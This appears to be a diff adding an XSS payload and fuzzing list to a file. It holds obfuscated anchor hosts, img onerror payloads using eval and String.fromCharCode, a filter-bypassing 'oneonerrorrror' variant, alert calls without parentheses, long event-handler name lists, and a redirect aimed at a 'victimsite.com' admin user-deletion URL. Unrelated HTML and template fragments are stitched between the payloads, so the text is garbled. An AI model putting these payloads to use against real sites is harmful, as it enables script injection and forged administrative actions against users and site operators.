@@ -1,0 +1,100 @@
+Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
+<A HREF="http://66.102.7.147/">XSS</A>
+<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
+<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
+id="x">x</div>
+</div>
+<div id="123"><span class=foo>Some text</span>
+  id    ID    #REQUIRED>]>
+        </xsl:template>
+    <circle fill="red" r="40"></circle>
+Same effect with
+-->
+<math>
+<div id="131"><b>drag and drop one of the following strings to the drop box:</b>
+<br/><hr/>
+<br/><hr/>
+<br/><hr/>
+<br/><hr/>
+<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>
+<br>
+<input name="secret" type="password">
+</image>
+<div id="134"><xmp>
+<%
+</xmp>
+x='<%'
+XXX
+-->{}
+</template>
+<input name="username" value="admin" />
+<input name="password" type="password" value="secret" />
+<input type="submit">
+<circle r="400"></circle>
+Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
+<A HREF="http://66.102.7.147/">XSS</A>
+onBeforeActivate
+onBeforeUpdate
+onBegin
+onBlur
+onBounce
+onCellChange
+onChange
+onCut
+onDataAvailable
+onDataSetChanged
+onDataSetComplete
+onDblClick
+onDeactivate
+onDrag
+onDragDrop
+onDragEnd
+onDragEnter
+onError
+onErrorUpdate
+onFilterChange
+onHelp
+onInput
+onKeyDown
+onKeyPress
+onKeyUp
+onLayoutComplete
+onLoad
+onLoseCapture
+onMediaComplete
+onMediaError
+onRepeat
+onReset
+onResize
+onResizeEnd
+onResizeStart
+onResume
+onReverse
+onRowDelete
+alert`1`
+alert&lpar;1&rpar;
+(alert)(1)
+<img src=x onerror=alert(String.fromCharCode(88,83,83));>
+<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
+<img src=x:alert(alt) onerror=eval(src) alt=xss>
+onbounce
+oncanplay
+onchange
+onclick
+onclose
+oncontextmenu
+oncopy
+oncuechange
+oncut
+ondblclick
+ondrag
+ondragend
+ondragenter
+ondurationchange
+onend
+onended
+onerror
+onloadeddata
+onloadedmetadata
+onloadstart
+onmessage
